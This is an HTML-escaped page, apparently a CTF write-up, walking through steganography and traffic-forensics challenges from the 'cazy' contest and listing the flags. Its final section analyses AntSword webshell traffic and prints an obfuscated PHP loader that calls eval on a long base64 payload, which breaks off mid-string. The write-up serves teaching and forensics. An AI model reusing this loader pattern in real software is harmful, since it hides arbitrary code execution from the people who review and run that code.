+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cawvxUian&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;will&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;certainlv&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;succeed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;in&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fighting&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;the&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;epidemicz&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#根据上面的对应然后将其进行整理可得&lt;/span&gt;
+cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;无字天书&#34;&gt;无字天书&lt;/h3&gt;
+&lt;p&gt;蚁剑流量&lt;/p&gt;
+&lt;p&gt;流量后面发现 zip 文件的头部 hex &lt;code&gt;504B&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 555; 
+			flex-basis: 1333px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_hex.png&#34; data-size=&#34;1834x330&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_hex.png&#34;
+			width=&#34;1834&#34;
+			height=&#34;330&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_hex_hubfba0fdff2c25ef9d71139ed7cb97b9a_35118_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_hex_hubfba0fdff2c25ef9d71139ed7cb97b9a_35118_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;提取出来后发现是一个 zip&lt;/p&gt;
+&lt;p&gt;解压后得到 &lt;code&gt;key.ws&lt;/code&gt; 和 &lt;code&gt;flag.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1150; 
+			flex-basis: 2761px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_unzip.png&#34; data-size=&#34;794x69&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_unzip.png&#34;
+			width=&#34;794&#34;
+			height=&#34;69&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_unzip_hu784ed406fcba924f694f9da8b75c5dc5_6426_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_unzip_hu784ed406fcba924f694f9da8b75c5dc5_6426_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;key.ws是whitesapce&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://vii5ard.github.io/whitespace/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://vii5ard.github.io/whitespace/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 152; 
+			flex-basis: 367px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_whitespace.png&#34; data-size=&#34;1227x802&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_whitespace.png&#34;
+			width=&#34;1227&#34;
+			height=&#34;802&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_whitespace_huc6a598eee22ebe633332145d46262d1a_26756_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_whitespace_huc6a598eee22ebe633332145d46262d1a_26756_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;得到密码 &lt;code&gt;XiAnWillBeSafe&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;再去用 snow 去利用这个密码解 &lt;code&gt;flag.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 767; 
+			flex-basis: 1840px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_flag.png&#34; data-size=&#34;1235x161&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_flag.png&#34;
+			width=&#34;1235&#34;
+			height=&#34;161&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_flag_hudf697411f59c799b9713e11888e82ad9_19268_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/wzts_flag_hudf697411f59c799b9713e11888e82ad9_19268_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;西安加油&#34;&gt;西安加油&lt;/h3&gt;
+&lt;p&gt;流量 http 对象导出 &lt;code&gt;secret.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;解 base64 发现是一个压缩包&lt;/p&gt;
+&lt;p&gt;后面部分就是拼图&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 190; 
+			flex-basis: 457px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/xajy_unzip.png&#34; data-size=&#34;1629x854&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/xajy_unzip.png&#34;
+			width=&#34;1629&#34;
+			height=&#34;854&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/xajy_unzip_hue779cefb9b8f42d5ea7da3697376b0b5_1144406_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/xajy_unzip_hue779cefb9b8f42d5ea7da3697376b0b5_1144406_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;还原结果&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 159; 
+			flex-basis: 383px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/xajy_flag.png&#34; data-size=&#34;1251x783&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/xajy_flag.png&#34;
+			width=&#34;1251&#34;
+			height=&#34;783&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/xajy_flag_hu4480f8fae870f62ac1c94b3295fd4e82_2729435_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/xajy_flag_hu4480f8fae870f62ac1c94b3295fd4e82_2729435_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;binary&#34;&gt;binary&lt;/h3&gt;
+&lt;p&gt;file命令 显示这是个class文件&lt;/p&gt;
+&lt;p&gt;利用luyten反编译得到源码&lt;/p&gt;
+&lt;p&gt;发现是一堆数据 ascii转chr&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;base64之后得到1369个01的组合 可被开方为37推测其应该是一个二维码&lt;/p&gt;
+&lt;p&gt;画图:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; PIL &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Image 
+MAX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;
+pic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Image&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RGB&amp;#34;&lt;/span&gt;,(MAX,MAX))
+str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000&amp;#34;&lt;/span&gt;
+
+i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,MAX):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,MAX):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(str[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;):
+            pic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;putpixel([x,y],(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+            pic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;putpixel([x,y],(&lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;))
+        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+pic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
+pic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.png&amp;#39;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的二维码扫码得到flag&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 81; 
+			flex-basis: 196px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/binary_flag.png&#34; data-size=&#34;673x822&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/binary_flag.png&#34;
+			width=&#34;673&#34;
+			height=&#34;822&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/binary_flag_hu5f71b0660a1c361f03b70dccbe60881c_202558_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/binary_flag_hu5f71b0660a1c361f03b70dccbe60881c_202558_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;flag{932b2c0070e4897ea7df0190dbf36ece}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ez_steg&#34;&gt;Ez_Steg&lt;/h3&gt;
+&lt;p&gt;压缩包注释告诉说是6个数字 爆破压缩包密码得到220101&lt;/p&gt;
+&lt;p&gt;然后得到两个文件&lt;/p&gt;
+&lt;p&gt;stegosaurus工具求解pyc隐写&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 983; 
+			flex-basis: 2361px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/ez_steg.png&#34; data-size=&#34;669x68&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/ez_steg.png&#34;
+			width=&#34;669&#34;
+			height=&#34;68&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/ez_steg_huf2f6a4fc6b6f96e4cc8281c74c92068b_18734_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/ez_steg_huf2f6a4fc6b6f96e4cc8281c74c92068b_18734_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;得到 &lt;code&gt;TheKey:St3g1sV3ryFuNny&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;emjoy猜测是 emjoy-aes&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://aghorler.github.io/emoji-aes/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://aghorler.github.io/emoji-aes/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;解码得到flag&lt;/p&gt;
+&lt;p&gt;flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cazy{Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ez_encrypt&#34;&gt;ez_Encrypt&lt;/h3&gt;
+&lt;p&gt;蚁剑流量&lt;/p&gt;
+&lt;p&gt;解一下一开始的base64发现是pop链&lt;/p&gt;
+&lt;p&gt;但是都不重要 直接锁定最后的web123&lt;/p&gt;
+&lt;p&gt;base64解开以后是一个压缩包&lt;/p&gt;
+&lt;p&gt;解压后在app\controller\index.php找到了混淆后的php代码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-pyp&#34; data-lang=&#34;pyp&#34;&gt;&amp;lt;?php define(&#39;IKlSux1227&#39;,__FILE__);$DusPFr=base64_decode(&amp;quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==&amp;quot;);$arCiCL=$DusPFr[3].$DusPFr[6].$DusPFr[33].$DusPFr[30];$VvUrBZ=$DusPFr[33].$DusPFr[10].$DusPFr[24].$DusPFr[10].$DusPFr[24];$DEomKk=$VvUrBZ[0].$DusPFr[18].$DusPFr[3].$VvUrBZ[0].$VvUrBZ[1].$DusPFr[24];$LnpnvY=$DusPFr[7].$DusPFr[13];$arCiCL.=$DusPFr[22].$DusPFr[36].$DusPFr[29].$DusPFr[26].$DusPFr[30].$DusPFr[32].$DusPFr[35].$DusPFr[26].$DusPFr[30];eval($arCiCL(&amp;quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXN